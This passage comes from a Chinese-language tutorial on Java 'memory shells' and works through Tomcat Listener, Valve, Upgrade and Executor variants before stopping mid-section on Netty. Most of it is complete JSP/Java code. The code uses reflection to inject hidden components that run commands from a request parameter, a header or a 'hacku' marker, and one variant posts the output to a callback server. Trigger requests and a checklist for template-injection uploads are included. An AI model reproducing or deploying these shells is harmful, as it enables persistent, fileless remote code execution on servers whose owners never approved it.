            if (req.getParameter("cmd") != null){
                InputStream in = null;
                try {
                    in = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",req.getParameter("cmd")}).getInputStream();
                    Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
                    String out = s.hasNext()?s.next():"";
                    Field requestF = req.getClass().getDeclaredField("request");
                    requestF.setAccessible(true);
                    Request request = (Request)requestF.get(req);
                    request.getResponse().setCharacterEncoding("GBK");
                    request.getResponse().getWriter().write(out);
                }
                catch (Exception ignored) {}
            }
        }
        public void requestInitialized(ServletRequestEvent sre) {}
    }
%>

<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
    EvilListener evilListener = new EvilListener();
    context.addApplicationEventListener(evilListener);
    out.println("[+]&nbsp;&nbsp;&nbsp;&nbsp;Inject Listener Memory Shell successfully!<br>[+]&nbsp;&nbsp;&nbsp;&nbsp;Shell url: http://localhost:8080/test/?cmd=ipconfig");
%>
```

![image-20250617171025240](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250617171025240.png)

POST：我这里弄个POST请求的内存马，可以看到我们可以在站点Context下任意Servlet执行命令

```jsp
<%@ page import="javax.servlet.ServletContext,javax.servlet.ServletRequestListener,javax.servlet.ServletRequestEvent,javax.servlet.http.HttpServletRequest,org.apache.catalina.core.StandardContext,java.lang.reflect.Field" %>
<%
    // JSP恶意内存马脚本，注入自定义Listener并执行cmd参数
    ServletContext servletContext = application;

    try {
        // 反射获取StandardContext
        Field contextField = servletContext.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        Object appCtxFacade = contextField.get(servletContext);

        Field innerCtxField = appCtxFacade.getClass().getDeclaredField("context");
        innerCtxField.setAccessible(true);
        StandardContext standardContext = (StandardContext) innerCtxField.get(appCtxFacade);

        // 定义并注入恶意Listener
        ServletRequestListener evilListener = new ServletRequestListener() {
            @Override
            public void requestInitialized(ServletRequestEvent sre) {
                try {
                    if (sre.getServletRequest() instanceof HttpServletRequest) {
                        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
                        if ("POST".equalsIgnoreCase(req.getMethod())) {
                            String cmd = req.getParameter("cmd");
                            if (cmd != null && !cmd.isEmpty()) {
                                // 支持 Mac/Linux
                                String[] execCmd = new String[]{"/bin/sh", "-c", cmd};
                                Runtime.getRuntime().exec(execCmd);
                            }
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void requestDestroyed(ServletRequestEvent sre) {
                // 清理逻辑（可选）
            }
        };

        // 注入Listener
        standardContext.addApplicationEventListener(evilListener);
        out.println("[EvilListener] 已注入并激活");
    } catch (Exception ex) {
        ex.printStackTrace();
    }
%>
<html>
<head><title>Listener 注入成功</title></head>
<body>
<h3>恶意 Listener 已注入并生效。POST 请求可通过 cmd 参数执行命令。</h3>
<form method="post">
    Command: <input type="text" name="cmd" />
    <input type="submit" value="执行" />
</form>
</body>
</html>

```

![image-20250617170136024](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250617170136024.png)

### 3.2.1.Listener 内存马 demo 代码分析

```markdown
1.继承并编写一个恶意Listener
2.获取StandardContext，
3.调用StandardContext.addApplicationEventListener()添加恶意Listener
```

#### 1. 继承并编写一个恶意 Listener

恶意 `Listener` 通常是继承自 `ServletContextListener`、`ServletRequestListener` 或 `HttpSessionListener` 等接口。其目的是监听应用程序的生命周期事件，如上下文的初始化、销毁，或者请求和会话的生命周期。

在这个步骤中，需要创建一个继承自相关接口的类，并重写其生命周期方法。比如：

```java
public class MaliciousListener implements ServletContextListener {
    @Override
    public void contextInitialized(ServletContextEvent sce) {
        // 在此执行恶意操作，如反序列化、写入恶意文件等
        System.out.println("恶意监听器已初始化！");
    }

    @Override
    public void contextDestroyed(ServletContextEvent sce) {
        // 在此执行销毁时的恶意操作
        System.out.println("恶意监听器已销毁！");
    }
}
```

#### 2. 获取 StandardContext

`StandardContext` 是 Tomcat 中用于处理应用上下文的类。通过这个类，可以访问当前应用的生命周期管理，并操作其事件监听器。

在代码中，可以通过 `ServletContext` 获取到 `StandardContext`，通常是在 `contextInitialized` 方法中：

```java
ServletContext context = sce.getServletContext();
if (context instanceof StandardContext) {
    StandardContext standardContext = (StandardContext) context;
    // 可以在此对 StandardContext 进行操作
}
```

#### 3. 调用 `StandardContext.addApplicationEventListener()` 添加恶意 Listener

一旦获取到 `StandardContext`，可以使用 `addApplicationEventListener` 方法将的恶意监听器添加到应用中：

```java
StandardContext standardContext = (StandardContext) context;
standardContext.addApplicationEventListener(new MaliciousListener());
```

## 3.3.Tomcat Valve 型内存马

```markdown
因为在 Spring Boot 项目中解析 JSP 文件需要特殊配置，因为 Spring Boot 默认不推荐使用 JSP，它的设计理念是推崇RESTful API和使用模板引擎如Thymeleaf或Freemarker，这里我们不做额外配置了官方默认不解析实战同理解析概率极低，比较麻烦，所以后面测试站点时遇到上传点应该更多的去尝试模板注入，看看能不能上传恶意的html覆盖默认的模板地址中的内容，src/main/resources/templates/
```

这里可以了解一下模板注入，不过攻击链需要一点点抠

```markdown
参考文章：https://forum.butian.net/share/42
###核心利用条件
1. 上传漏洞存在
文件上传路径未校验（如允许上传.ftl、.jsp、.vm等模板文件）。
上传文件可被模板引擎解析（如上传路径被配置为模板目录）。
2. 模板引擎暴露
使用 FreeMarker、Thymeleaf、Velocity 等支持动态解析的模板引擎。
模板引擎未配置安全沙箱，或存在沙箱绕过漏洞。
3. 反射/类加载权限
应用具备足够权限调用Runtime.getRuntime().exec()或类似方法。
未禁用危险类（如java.lang.Runtime、freemarker.template.utility.Execute）。
```

这里尝试使用Demo，还是在之前的servlet项目里运行即可，不要在Spring的Web项目中运行

```markdown
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.*" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    Field requestField = request.getClass().getDeclaredField("request");
    requestField.setAccessible(true);
    final Request req = (Request) requestField.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
    Field pipelineField = ContainerBase.class.getDeclaredField("pipeline");
    pipelineField.setAccessible(true);
    StandardPipeline evilStandardPipeline = (StandardPipeline) pipelineField.get(standardContext);
    ValveBase evilValve = new ValveBase() {
        @Override
        public void invoke(Request request, Response response) throws ServletException,IOException {
            if (request.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in, "GBK").useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.setCharacterEncoding("GBK");
                PrintWriter out = response.getWriter();
                out.println(output);
                out.flush();
                out.close();
                this.getNext().invoke(request, response);
            }
        }
    };
    evilStandardPipeline.addValve(evilValve);
    out.println("inject success");
%>

```

![image-20250617192407430](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250617192407430.png)

![image-20250617190313671](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250617190313671.png)

## 3.4.Tomcat Upgrade 内存马

我们在之前的编写一个简单的 Tomcat Upgrade 的 demo基础上进行修改，将TestConfig这段修改一下

通过 addConnectorCustomizers 添加连接器定制逻辑，addUpgradeProtocol 注册 TomcatValveDemoApplication 作为WebSocket升级协议处理器。

```markdown
import com.example.tomcatvalvedemo.TomcatValveDemoApplication;
import org.apache.coyote.UpgradeProtocol;
import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
import org.springframework.boot.web.server.WebServerFactoryCustomizer;
import org.springframework.stereotype.Component;

@Component
public class TestConfig implements WebServerFactoryCustomizer<TomcatServletWebServerFactory> {

  @Override
  public void customize(TomcatServletWebServerFactory factory) {
    factory.addConnectorCustomizers(connector -> {
      connector.addUpgradeProtocol((UpgradeProtocol) new TomcatValveDemoApplication());
    });
  }
}
```

![image-20250618102351434](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618102351434.png)

创建我们的内存马，这里不想搞个WEB-INF目录了，还是上面说的Spring目录问题，如果有佬有更方便的办法可以教一下，直接用java版的内存马代码触发

```markdown
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Request;
import org.apache.coyote.Adapter;
import org.apache.coyote.Processor;
import org.apache.coyote.UpgradeProtocol;
import org.apache.coyote.Response;
import org.apache.coyote.http11.AbstractHttp11Protocol;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.util.HashMap;

@WebServlet("/test2")
public class TomcatUpgradeDemo extends HttpServlet {

  static class MyUpgrade implements UpgradeProtocol {
    @Override
    public String getHttpUpgradeName(boolean b) {
      return null;
    }

    @Override
    public byte[] getAlpnIdentifier() {
      return new byte[0];
    }

    @Override
    public String getAlpnName() {
      return null;
    }

    @Override
    public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
      return null;
    }

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {
      return null;
    }

    @Override
    public boolean accept(org.apache.coyote.Request request) {
      String p = request.getHeader("cmd");
      try {
        String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
        Field response = org.apache.coyote.Request.class.getDeclaredField("response");
        response.setAccessible(true);
        Response resp = (Response) response.get(request);
        byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream(), "GBK").useDelimiter("\\A").next().getBytes();
        resp.setCharacterEncoding("GBK");
        resp.doWrite(ByteBuffer.wrap(result));
      } catch (Exception ignored) {}
      return false;
    }
  }
  @Override
  protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
    try {
      RequestFacade rf = (RequestFacade) req;
      Field requestField = RequestFacade.class.getDeclaredField("request");
      requestField.setAccessible(true);
      Request request1 = (Request) requestField.get(rf);

      Field connector = Request.class.getDeclaredField("connector");
      connector.setAccessible(true);
      Connector realConnector = (Connector) connector.get(request1);

      Field protocolHandlerField = Connector.class.getDeclaredField("protocolHandler");
      protocolHandlerField.setAccessible(true);
      AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);

      HashMap<String, UpgradeProtocol> upgradeProtocols;
      Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
      upgradeProtocolsField.setAccessible(true);
      upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);

      MyUpgrade myUpgrade = new MyUpgrade();
      upgradeProtocols.put("doctor", myUpgrade);

      upgradeProtocolsField.set(handler, upgradeProtocols);
    } catch (Exception ignored) {}
  }
}

```

构造请求触发内存马

```markdown
# 这里的test是我们的Context，test2是内存马指定的触发servlet，只是用于第一次访问触发内存马，后续请求可以任意路径触发内存马。
GET /test/test2 HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
# 以下三个是自定义头必须的，这里的命令兼容win/mac
Connection: Upgrade
Upgrade: doctor
cmd: open -na Calculator
```

![image-20250618103350144](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618103350144.png)

任意路径即可触发

![image-20250618103435359](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618103435359.png)

如果有勤快的可以尝试一下JSP版本的内存马。

```markdown
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>
<%@ page import="org.apache.catalina.connector.Connector" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.coyote.Adapter" %>
<%@ page import="org.apache.coyote.Processor" %>
<%@ page import="org.apache.coyote.UpgradeProtocol" %>
<%@ page import="org.apache.coyote.Response" %>
<%@ page import="org.apache.coyote.http11.AbstractHttp11Protocol" %>
<%@ page import="org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler" %>
<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.util.HashMap" %>

<%!
    static class MyUpgrade implements UpgradeProtocol {
        @Override
        public String getHttpUpgradeName(boolean b) {
            return null;
        }

        @Override
        public byte[] getAlpnIdentifier() {
            return new byte[0];
        }

        @Override
        public String getAlpnName() {
            return null;
        }

        @Override
        public Processor getProcessor(SocketWrapperBase<?> socketWrapperBase, Adapter adapter) {
            return null;
        }

        @Override
        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {
            return null;
        }

        @Override
        public boolean accept(org.apache.coyote.Request request) {
            String p = request.getHeader("cmd");
            try {
                String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? 
                    new String[]{"cmd.exe", "/c", p} : 
                    new String[]{"/bin/sh", "-c", p};
                
                Field responseField = org.apache.coyote.Request.class.getDeclaredField("response");
                responseField.setAccessible(true);
                Response resp = (Response) responseField.get(request);
                
                byte[] result = new java.util.Scanner(
                    new ProcessBuilder(cmd).start().getInputStream(), "GBK"
                ).useDelimiter("\\A").next().getBytes();
                
                resp.setCharacterEncoding("GBK");
                resp.doWrite(ByteBuffer.wrap(result));
            } catch (Exception ignored) {}
            return false;
        }
    }
%>

<%
    try {
        RequestFacade rf = (RequestFacade) request;
        Field requestField = RequestFacade.class.getDeclaredField("request");
        requestField.setAccessible(true);
        Request request1 = (Request) requestField.get(rf);

        Field connectorField = Request.class.getDeclaredField("connector");
        connectorField.setAccessible(true);
        Connector realConnector = (Connector) connectorField.get(request1);

        Field protocolHandlerField = Connector.class.getDeclaredField("protocolHandler");
        protocolHandlerField.setAccessible(true);
        AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);

        HashMap<String, UpgradeProtocol> upgradeProtocols;
        Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
        upgradeProtocolsField.setAccessible(true);
        upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);

        MyUpgrade myUpgrade = new MyUpgrade();
        upgradeProtocols.put("doctor", myUpgrade);

        upgradeProtocolsField.set(handler, upgradeProtocols);
    } catch (Exception ignored) {}
%>

```

## 3.5.Tomcat Executor内存马

方法1：因为比较懒不想搞环境搞来搞去，发现Executor内存马在servlet项目中没有方法报错，在servlet demo项目中写入TomcatExecutorDemo

方法2：请教了W01fh4cker大佬，可以在原来的Tomcat Executor项目中引入org.apache.tomcat.embed，可以在Springweb项目中运行内存马，勤快的同学也可以试试。

```markdown
import java.io.IOException;
import java.util.concurrent.SynchronousQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class TomcatExecutorDemo extends ThreadPoolExecutor {

  public TomcatExecutorDemo() {
    super(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue<>());
  }

  @Override
  public void execute(Runnable command) {
    try {
      Runtime.getRuntime().exec(new String[]{"/usr/bin/open", "-a", "Calculator"});
    } catch (IOException e) {
      throw new RuntimeException(e);
    }
    super.execute(command);
  }
}
```

![image-20250618121236875](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618121236875.png)

再在web目录下写入内存马一样可以执行

```markdown
<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
<%@ page import="org.apache.tomcat.util.threads.ThreadPoolExecutor" %>
<%@ page import="java.util.concurrent.TimeUnit" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.concurrent.BlockingQueue" %>
<%@ page import="java.util.concurrent.ThreadFactory" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="org.apache.coyote.RequestInfo" %>
<%@ page import="org.apache.coyote.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="java.net.URLEncoder" %>
<%@ page import="java.util.concurrent.RejectedExecutionHandler" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%!
    public Object getField(Object object, String fieldName) {
        Field declaredField;
        Class<?> clazz = object.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException ignored) {}
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public Object getStandardService() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = this.getField(thread, "target");
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                } catch (Exception e) {
                }
                if (jioEndPoint == null) {
                    try {
                        jioEndPoint = getField(target, "endpoint");
                        return jioEndPoint;
                    } catch (Exception e) {
                        new Object();
                    }
                } else {
                    return jioEndPoint;
                }
            }

        }
        return new Object();
    }

    class threadexcutor extends ThreadPoolExecutor {

        public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
        }

        public void getRequest(Runnable command) {
            try {
                ByteBuffer byteBuffer = ByteBuffer.allocate(16384);
                byteBuffer.mark();
                SocketWrapperBase socketWrapperBase = (SocketWrapperBase) getField(command,"socketWrapper");
                socketWrapperBase.read(false,byteBuffer);
                ByteBuffer readBuffer = (ByteBuffer) getField(getField(socketWrapperBase,"socketBufferHandler"),"readBuffer");
                readBuffer.limit(byteBuffer.position());
                readBuffer.mark();
                byteBuffer.limit(byteBuffer.position()).reset();
                readBuffer.put(byteBuffer);
                readBuffer.reset();
                String a = new String(readBuffer.array(), StandardCharsets.UTF_8);
                if (a.contains("hacku")) {
                    String b = a.substring(a.indexOf("hacku") + "hacku".length() + 1, a.indexOf("\r", a.indexOf("hacku"))).trim();
                    if (b.length() > 1) {
                        try {
                            Runtime rt = Runtime.getRuntime();
                            Process process = rt.exec(new String[]{"/bin/bash","-c",b});
                            java.io.InputStream in = process.getInputStream();
                            java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                            java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                            StringBuilder s = new StringBuilder();
                            String tmp;
                            while ((tmp = stdInput.readLine()) != null) {
                                s.append(tmp);
                            }
                            if (!s.toString().isEmpty()) {
                                byte[] res = s.toString().getBytes(StandardCharsets.UTF_8);
                                getResponse(res);
                            }
                        } catch (IOException ignored) {}
                    }
                }
            } catch (Exception ignored) {}
        }

        public void getResponse(byte[] res) {
            try {
                Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
                for (Thread thread : threads) {
                    if (thread != null) {
                        String threadName = thread.getName();
                        if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                            Object target = getField(thread, "target");
                            if (target instanceof Runnable) {
                                try {
                                    ArrayList objects = (ArrayList) getField(getField(getField(getField(target, "endpoint"), "handler"), "global"), "processors");
                                    for (Object tmp_object : objects) {
                                        RequestInfo request = (RequestInfo) tmp_object;
                                        Response response = (Response) getField(getField(request, "req"), "response");
                                        String result = URLEncoder.encode(new String(res, StandardCharsets.UTF_8), StandardCharsets.UTF_8.toString());
                                        response.addHeader("shell", result);
                                    }
                                } catch (Exception ignored) {
                                    continue;
                                }
                            }
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }

        @Override
        public void execute(Runnable command) {
            getRequest(command);
            this.execute(command, 0L, TimeUnit.MILLISECONDS);
        }
    }
%>

<%
    NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();
    ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, "executor");
    threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
    nioEndpoint.setExecutor(exe);
%>
```

![image-20250618121258227](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618121258227.png)

还是同样的流程访问一遍内存马触发，然后访问任意Context执行命令，可以看到不存在的Context一样可以执行内存马

![image-20250618120403566](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618120403566.png)

![image-20250618120530146](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618120530146.png)

还有反连请求的内存马，这里不知道应对什么，如果是为了应对安全设备检测，服务端主动发送请求里也有字符串特征，如果应对无回显情况，那么上面的内存马放到response头也是可以回显的，两种方法吧下面这种更酷一些。

```markdown
<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
<%@ page import="org.apache.tomcat.util.threads.ThreadPoolExecutor" %>
<%@ page import="java.util.concurrent.TimeUnit" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.concurrent.BlockingQueue" %>
<%@ page import="java.util.concurrent.ThreadFactory" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.OutputStream" %>
<%@ page import="java.net.HttpURLConnection" %>
<%@ page import="java.net.URL" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="org.apache.coyote.RequestInfo" %>
<%@ page import="org.apache.coyote.Response" %>
<%@ page import="java.net.URLEncoder" %>
<%@ page import="java.util.Arrays" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%!
    public Object getField(Object object, String fieldName) {
        Field declaredField;
        Class<?> clazz = object.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException ignored) {}
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public Object getStandardService() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = this.getField(thread, "target");
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                } catch (Exception ignored) {}
                if (jioEndPoint == null) {
                    try {
                        jioEndPoint = getField(target, "endpoint");
                        return jioEndPoint;
                    } catch (Exception e) {
                        new Object();
                    }
                } else {
                    return jioEndPoint;
                }
            }
        }
        return new Object();
    }

    class threadexcutor extends ThreadPoolExecutor {

        public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
        }

        public void getRequest(Runnable command) {
            try {
                ByteBuffer byteBuffer = ByteBuffer.allocate(16384);
                byteBuffer.mark();
                SocketWrapperBase socketWrapperBase = (SocketWrapperBase) getField(command, "socketWrapper");
                socketWrapperBase.read(false, byteBuffer);
                ByteBuffer readBuffer = (ByteBuffer) getField(getField(socketWrapperBase, "socketBufferHandler"), "readBuffer");
                readBuffer.limit(byteBuffer.position());
                readBuffer.mark();
                byteBuffer.limit(byteBuffer.position()).reset();
                readBuffer.put(byteBuffer);
                readBuffer.reset();
                String a = new String(readBuffer.array(), StandardCharsets.UTF_8);
                if (a.contains("hacku")) {
                    String b = a.substring(a.indexOf("hacku") + "hacku".length() + 1, a.indexOf("\r", a.indexOf("hacku"))).trim();
                    if (b.length() > 1) {
                        try {
                            Runtime rt = Runtime.getRuntime();
                            Process process = rt.exec("cmd /c " + b);
                            java.io.InputStream in = process.getInputStream();
                            java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                            java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                            StringBuilder s = new StringBuilder();
                            String tmp;
                            while ((tmp = stdInput.readLine()) != null) {
                                s.append(tmp);
                            }
                            if (!s.toString().isEmpty()) {
                                byte[] res = s.toString().getBytes(StandardCharsets.UTF_8);
                                getResponse(res);
                            }
                        } catch (IOException ignored) {
                        }
                    }
                }
            } catch (Exception ignored) {}
        }

        public void getResponse(byte[] res) {
            try {
                Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
                for (Thread thread : threads) {
                    if (thread != null) {
                        String threadName = thread.getName();
                        if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                            Object target = getField(thread, "target");
                            if (target instanceof Runnable) {
                                try {
                                    ArrayList objects = (ArrayList) getField(getField(getField(getField(target, "endpoint"), "handler"), "global"), "processors");
                                    for (Object tmp_object : objects) {
                                        RequestInfo request = (RequestInfo) tmp_object;
                                        Response response = (Response) getField(getField(request, "req"), "response");
                                        if(sendPostRequest("http://127.0.0.1:8085", res)){
                                            response.addHeader("Result", "success");
                                        } else {
                                            response.addHeader("Result", "failed");
                                        }
                                    }
                                } catch (Exception ignored) {
                                    continue;
                                }
                            }
                        }
                    }
                }
            } catch (Exception ignored) {}
        }

        private boolean sendPostRequest(String urlString, byte[] data) {
            try {
                URL url = new URL(urlString);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                connection.setRequestProperty("Content-Type", "application/octet-stream");
                connection.setRequestProperty("Content-Length", String.valueOf(data.length));
                try (OutputStream outputStream = connection.getOutputStream()) {
                    outputStream.write(data);
                    outputStream.flush();
                    int responseCode = connection.getResponseCode();
                    return responseCode == HttpURLConnection.HTTP_OK;
                } catch (Exception ignored){
                    return false;
                }
            } catch (IOException ignored) {
                return false;
            }
        }

        @Override
        public void execute(Runnable command) {
            getRequest(command);
            this.execute(command, 0L, TimeUnit.MILLISECONDS);
        }
    }
%>

<%
    NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();
    ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, "executor");
    threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
    nioEndpoint.setExecutor(exe);
%>
```

yakit配置反连服务器这样就可以持续接受服务端连接

![image-20250618134107293](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618134107293.png)

还是一样请求内存马地址触发内存马植入，这里的success是累加的，因为我们请求了好几次所以实际应该是生成了3个内存马

![image-20250618134138731](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618134138731.png)

再请求任意地址触发内存马获取服务端主动请求

![image-20250618134309919](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618134309919.png)

![image-20250618134842645](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250618134842645.png)

## 3.6.Netty中间件内存马

### 1.Netty&SpringWebFlux&SpringCloudGateway的关系

```markdown
这里Netty比较特别，很多人分不清它跟SpringWebFlux的关系：

★Spring WebFlux 默认使用 Netty用作核心容器，因其完全适配响应式非阻塞模型。Spring WebFlux 不依赖传统的 Servlet 容器（如 Tomcat），而是基于 响应式流规范（Reactive Streams），因此需要支持异步非阻塞 IO 的服务器。其主要支持以下服务器：
 1. Netty：作为默认且最常用的服务器，Netty 是异步事件驱动的网络框架，完全契合响应式编程模型，是 Spring WebFlux 的首选容器。
 2. Undertow：Red Hat 开发的轻量级高性能服务器，同样支持响应式编程，可作为 WebFlux 的运行容器。
